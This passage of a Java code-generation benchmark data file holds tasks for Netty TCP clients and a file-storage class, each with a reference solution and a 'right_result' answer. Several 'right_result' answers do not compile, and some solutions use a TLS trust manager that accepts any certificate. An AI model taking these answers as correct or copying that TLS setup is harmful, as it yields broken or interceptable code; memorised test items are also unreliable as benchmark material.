unlockForIoOperation() -> void - Releases the read lock after IO operations\n- close: close() -> void - Closes the file channel and releases all resources\n- ensureOpen: ensureOpen() -> void - Private method to verify the file channel is open before operations",
    "Canonical_solution": "import bt.data.StorageUnit;\nimport bt.net.buffer.ByteBufferView;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReadWriteLock;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\n\nclass CachedOpenFile implements StorageUnit {\n    private final FileChannel fc;\n    private final ReadWriteLock lock = new ReentrantReadWriteLock();\n    private final long capacity;\n\n    CachedOpenFile(Path file, long capacity) {\n        try {\n            Path parent = file.getParent();\n            if (parent != null) {\n                Files.createDirectories(parent);\n            }\n            fc = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        } catch (IOException ex) {\n            throw new UncheckedIOException(\"Could not open file \" + file.toAbsolutePath(), ex);\n        }\n        this.capacity = capacity;\n    }\n\n    @Override\n    public int readBlock(ByteBuffer buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to read past the end of file (offset: \" + offset +\n                    \", requested block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return fc.read(buffer, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to read bytes (offset: \" + offset +\n                    \", requested block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public int writeBlock(ByteBuffer buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to write past the end of file (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return fc.write(buffer, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to write bytes (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public int writeBlock(ByteBufferView buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to write past the end of file (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return buffer.transferTo(fc, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to write bytes (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public long capacity() {\n        return capacity;\n    }\n\n    @Override\n    public long size() {\n        ensureOpen();\n        try {\n            return fc.size();\n        } catch (IOException ex) {\n            throw new UncheckedIOException(ex);\n        }\n    }\n\n    public void flush() throws IOException {\n        if (fc.isOpen())\n            this.fc.force(false);\n    }\n\n    public void lockForIoOperation() {\n        this.lock.readLock().lock();\n    }\n\n    public void unlockForIoOperation() {\n        this.lock.readLock().unlock();\n    }\n\n    @Override\n    public void close() throws IOException {\n        lock.writeLock().lock();\n        try {\n            this.fc.close();\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    private void ensureOpen() {\n        if (!fc.isOpen()) {\n            throw new IllegalStateException(\"Cannot access a closed file.\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.concurrent.locks.ReadWriteLock;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\n\npublic class CachedOpenFile {\n    private final FileChannel fc;\n    private final ReadWriteLock lock;\n    private final long capacity;\n\n    public CachedOpenFile(Path file, long capacity) throws IOException {\n        this.capacity = capacity;\n        lock = new ReentrantReadWriteLock();\n        Files.createDirectories(file.getParent());\n        try {\n            fc = FileChannel.open(file, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);\n            fc.truncate(capacity);\n        } catch (IOException e) {\n            if (fc != null) {\n                try {\n                    fc.close();\n                } catch (IOException ex) {\n                    // ignore\n                }\n            }\n            throw e;\n        }\n    }\n\n    public int readBlock(ByteBuffer buffer, long offset) throws IOException {\n        lock.readLock().lock();\n        try {\n            ensureOpen();\n            return fc.read(buffer, offset);\n        } finally {\n            lock.readLock().unlock();\n        }\n    }\n\n    public int writeBlock(ByteBuffer buffer, long offset) throws IOException {\n        lock.writeLock().lock();\n        try {\n            ensureOpen();\n            return fc.write(buffer, offset);\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    public int writeBlock(ByteBufferView buffer, long offset) throws IOException {\n        lock.writeLock().lock();\n        try {\n            ensureOpen();\n            return fc.write(buffer.getByteBuffer(), offset);\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    public long capacity() {\n        return capacity;\n    }\n\n    public long size() throws IOException {\n        ensureOpen();\n        return fc.size();\n    }\n\n    public void flush() throws IOException {\n        ensureOpen();\n        fc.flush();\n    }\n\n    public void lockForIoOperation() {\n        lock.readLock().lock();\n    }\n\n    public void unlockForIoOperation() {\n        lock.readLock().unlock();\n    }\n\n    public void close() throws IOException {\n        ensureOpen();\n        fc.close();\n    }\n\n    private void ensureOpen() throws IOException {\n        if (fc == null || !fc.isOpen()) {\n            throw new IOException(\"File channel is closed\");\n        }\n    }\n}"
  },
  {
    "Task_id": 151,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, handle incoming data, and manage connection lifecycle.\n\nClass Description: The TimeClient class establishes and manages a non-blocking TCP connection to a specified server using Netty's NIO framework. It handles connection setup, message processing through a custom pipeline, and graceful shutdown of resources.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server\nworkerGroup: EventLoopGroup - Netty's event loop group for handling I/O operations\nbootstrap: Bootstrap - Netty's client bootstrap for configuring and starting the client\n\nMethods:\nTimeClient(String host, int port) -> None - Constructor that initializes the client with target server details and creates necessary Netty components\nstart() -> void - Configures and starts the Netty client, establishes connection to server, and waits for connection closure\nstop() -> void - Shuts down the client gracefully by releasing all resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n\n    private String host;\n    private int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(workerGroup)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new TimeDecoder());\n                            ch.pipeline().addLast(new TimeClientHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.buffer.Unpooled;\nimport java.nio.charset.StandardCharsets;\n\npublic class TimeClient {\n    private String host;\n    private int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        this.bootstrap.group(workerGroup)\n                      .channel(NioSocketChannel.class)\n                      .handler(new TimeClientHandler());\n    }\n\n    public void start() {\n        bootstrap.connect(host, port).addListener((ChannelFuture future) -> {\n            if (future.isSuccess()) {\n                future.channel().closeFuture().awaitUninterruptibly();\n            } else {\n                future.cause().printStackTrace();\n            }\n        });\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public static class TimeClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            ctx.writeAndFlush(Unpooled.copiedBuffer(\"Hello, Server!\".getBytes(StandardCharsets.UTF_8)));\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            System.out.println(\"Received: \" + msg);\n            ctx.close();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 152,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send periodic messages, and handle graceful shutdown.\n\nClass Description: MyClient is a Netty-based TCP client that connects to a specified host and port, sends periodic messages containing Chinese poetry, and manages network resources properly. The client uses custom encoders/decoders and handlers for message processing.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server to connect to\n\nMethods:\nconstructor: MyClient(String host, int port) -> void - Initializes the client with target host and port information\nrun: run() -> void - Main method that establishes the connection, sends periodic messages, and manages resources. Throws InterruptedException for thread-related operations\ninitChannel: initChannel(SocketChannel ch) -> void - Configures the channel pipeline with custom encoders, decoders, and handlers (internal method within ChannelInitializer)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class MyClient {\n\n    private String host;\n    private int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"decoder\", new MyDecoder());\n                    ch.pipeline().addLast(\"encoder\", new MyEncoder());\n                    ch.pipeline().addLast(new MyClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                Msg msg = new Msg();\n                MsgHeader msgHeader = new MsgHeader();\n                msgHeader.setMsgType(MsgType.EMGW_LOGIN_REQ.getValue());\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n\n                byte[] bodyBytes = body.getBytes(Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                msgHeader.setLen(bodySize);\n                msg.setMsgHeader(msgHeader);\n                msg.setBody(body);\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.TimeUnit;\n\npublic class MyClient {\n    private final String host;\n    private final int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new CustomEncoder());\n                            ch.pipeline().addLast(new CustomDecoder());\n                            ch.pipeline().addLast(new MyClientHandler());\n                        }\n                    });\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();\n            scheduler.scheduleAtFixedRate(() -> {\n                String poem = getPoem();\n                future.channel().writeAndFlush(poem + \"\\n\");\n            }, 0, 5, TimeUnit.SECONDS);\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private String getPoem() {\n        return \"\u9759\u591c\u601d\\n\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\\n\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n    }\n\n    static class CustomEncoder extends io.netty.handler.codec.string.StringEncoder {}\n    static class CustomDecoder extends io.netty.handler.codec.string.StringDecoder {}\n\n    static class MyClientHandler extends io.netty.channel.ChannelHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            System.out.println(\"Connected to server\");\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String message = (String) msg;\n            System.out.println(\"Received: \" + message);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 153,
    "Instruction": "Task Description: Create a TCP client using Java Netty framework that can establish a secure/non-secure connection to a remote server, send messages from standard input, and gracefully handle connection termination.\n\nClass Description: TelnetClient is a Netty-based TCP client that connects to a specified host and port, supports SSL/TLS encryption when configured, and provides interactive message sending capability through standard input.\n\nAttributes:\nSSL: static final boolean - Flag indicating whether SSL/TLS encryption should be used\nHOST: static final String - The host address to connect to (default: \"127.0.0.1\")\nPORT: static final int - The port number to connect to (default: 8992 for SSL, 8023 for non-SSL)\n\nMethods:\nstart: void() throws Exception - Main method that initializes the Netty client, establishes connection, handles user input, and manages connection lifecycle\n  - Initializes SSL context if SSL is enabled\n  - Creates and configures Netty Bootstrap with NioEventLoopGroup\n  - Establishes connection to specified host and port\n  - Reads input from console and sends to server\n  - Handles graceful shutdown on \"bye\" command or connection close",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class TelnetClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new TelnetClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class TelnetClient {\n    public static final boolean SSL = true;\n    public static final String HOST = \"127.0.0.1\";\n    public static final int PORT = SSL ? 8992 : 8023;\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) throws Exception {\n                             ChannelPipeline pipeline = ch.pipeline();\n                             if (SSL) {\n                                 SslContext sslContext = new SslContextBuilder().forClient().build();\n                                 pipeline.addLast(sslContext.newHandler(ch));\n                             }\n                             pipeline.addLast(new TelnetClientHandler());\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(HOST, PORT).sync();\n\n            new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        if (\"bye\".equals(line)) {\n                            future.channel().close();\n                            break;\n                        }\n                        future.channel().writeAndFlush(Unpooled.copiedBuffer(line.getBytes()));\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class TelnetClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof ByteBuf) {\n                ByteBuf buf = (ByteBuf) msg;\n                byte[] bytes = new byte[buf.readableBytes()];\n                buf.readBytes(bytes);\n                String response = new String(bytes);\n                System.out.println(\"Server: \" + response);\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        new TelnetClient().start();\n    }\n}"
  },
  {
    "Task_id": 156,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish secure or non-secure connections to a remote server, with capabilities for graceful shutdown.\n\nClass Description: The HttpUploadClient class provides functionality to create and manage a Netty-based TCP client that can connect to a specified host and port, with optional SSL/TLS encryption. It handles connection establishment, channel management, and resource cleanup.\n\nAttributes:\n- host: [String] - The hostname or IP address of the remote server to connect to\n- port: [int] - The port number of the remote server\n- ssl: [boolean] - Flag indicating whether SSL/TLS encryption should be used\n- sslCtx: [SslContext] - Netty's SSL context for secure connections (null if ssl is false)\n- group: [EventLoopGroup] - Netty event loop group for managing I/O operations\n- bootstrap: [Bootstrap] - Netty bootstrap for configuring client connection parameters\n\nMethods:\n- HttpUploadClient(String host, int port, boolean ssl) -> [Constructor] - Initializes the client with connection parameters and SSL configuration if needed\n- connect() -> [Channel] - Establishes a connection to the remote server and returns the communication channel\n- shutdown() -> [void] - Shuts down the client gracefully and releases all resources\n- main(String[] args) -> [void] - Example usage demonstrating client initialization, connection, and shutdown",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.util.internal.SocketUtils;\n\npublic class HttpUploadClient {\n\n    private final String host;\n    private final int port;\n    private final boolean ssl;\n    private final SslContext sslCtx;\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n\n    public HttpUploadClient(String host, int port, boolean ssl) throws Exception {\n        this.host = host;\n        this.port = port;\n        this.ssl = ssl;\n        \n        if (ssl) {\n            this.sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            this.sslCtx = null;\n        }\n\n        this.group = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new HttpUploadClientInitializer(sslCtx));\n    }\n\n    public Channel connect() throws InterruptedException {\n        ChannelFuture future = bootstrap.connect(SocketUtils.socketAddress(host, port));\n        return future.sync().channel();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        String host = \"127.0.0.1\";\n        int port = 8080;\n        boolean ssl = false;\n\n        HttpUploadClient client = new HttpUploadClient(host, port, ssl);\n        try {\n            Channel channel = client.connect();\n            // Perform operations with the channel here\n        } finally {\n            client.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\n\npublic class HttpUploadClient {\n    private String host;\n    private int port;\n    private boolean ssl;\n    private SslContext sslCtx;\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpUploadClient(String host, int port, boolean ssl) {\n        this.host = host;\n        this.port = port;\n        this.ssl = ssl;\n        this.group = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        bootstrap.group(group);\n        bootstrap.channel(NioSocketChannel.class);\n        if (ssl) {\n            try {\n                sslCtx = SslContext.newClientContext();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n            bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new SslHandler(sslCtx.newEngine()));\n                }\n            });\n        } else {\n            bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    // No handlers added\n                }\n            });\n        }\n    }\n\n    public Channel connect() {\n        ChannelFuture future = bootstrap.connect(host, port).syncUninterruptibly();\n        this.channel = future.channel();\n        return channel;\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close().awaitUninterruptibly();\n        }\n        group.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        String host = \"localhost\";\n        int port = 8080;\n        boolean ssl = false;\n        HttpUploadClient client = new HttpUploadClient(host, port, ssl);\n        Channel channel = client.connect();\n        client.shutdown();\n    }\n}"
  },
  {
    "Task_id": 157,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send periodic messages, and handle graceful shutdown.\n\nClass Description: The MyClient class represents a Netty-based TCP client that connects to a specified host and port, sends periodic messages containing Chinese poetry, and manages network resources properly.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- Constructor: MyClient(String host, int port) -> void - Initializes the client with target host and port information\n- run: run() -> void - Main method that:\n  1. Initializes Netty client components\n  2. Establishes TCP connection\n  3. Periodically sends message objects containing Chinese poetry\n  4. Handles graceful shutdown of network resources\n  5. Throws InterruptedException if interrupted during operation",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class MyClient {\n\n    private String host;\n    private int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"codec\", new MyCodec());\n                    ch.pipeline().addLast(new MyClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                Msg msg = new Msg();\n                MsgHeader msgHeader = new MsgHeader();\n                msgHeader.setMsgType(MsgType.EMGW_LOGIN_REQ.getValue());\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n\n                byte[] bodyBytes = body.getBytes(Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                msgHeader.setLen(bodySize);\n                msg.setMsgHeader(msgHeader);\n                msg.setBody(body);\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap; import io.netty.channel.Channel; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelInitializer; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.nio.NioSocketChannel; import java.util.concurrent.Executors; import java.util.concurrent.ScheduledExecutorService; import java.util.concurrent.TimeUnit; public class MyClient { private final String host; private final int port; private Channel channel; private ScheduledExecutorService scheduler; public MyClient(String host, int port) { this.host = host; this.port = port; } public void run() throws InterruptedException { EventLoopGroup group = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(group) .channel(NioSocketChannel.class) .handler(new ChannelInitializer<SocketChannel>() { @Override protected void initChannel(SocketChannel ch) { } }); ChannelFuture future = bootstrap.connect(host, port).awaitUninterruptibly(); channel = future.channel(); scheduler = Executors.newScheduledThreadPool(1); scheduler.scheduleAtFixedRate(() -> { String poem = getPoem(); channel.writeAndFlush(poem + \"\\n\").addListener(future1 -> { if (future1.isSuccess()) { System.out.println(\"Sent: \" + poem); } else { System.err.println(\"Failed to send: \" + poem); } }); }, 0, 5, TimeUnit.SECONDS); Thread.sleep(Long.MAX_VALUE); } finally { if (scheduler != null) { scheduler.shutdown(); } if (channel != null) { channel.close(); } group.shutdownGracefully(); } } private String getPoem() { String[] poems = { \"\u9759\u591c\u601d\\n\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\\n\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\", \"\u6625\u6653\\n\u6625\u7720\u4e0d\u89c9\u6653\uff0c\u5904\u5904\u95fb\u557c\u9e1f\u3002\\n\u591c\u6765\u98ce\u96e8\u58f0\uff0c\u82b1\u843d\u77e5\u591a\u5c11\u3002\", \"\u76f8\u601d\\n\u7ea2\u8c46\u751f\u5357\u56fd\uff0c\u6625\u6765\u53d1\u51e0\u679d\u3002\\n\u613f\u541b\u591a\u91c7\u64b7\uff0c\u6b64\u7269\u6700\u76f8\u601d\u3002\" }; int index = (int) (Math.random() * poems.length); return poems[index]; } }"
  },
  {
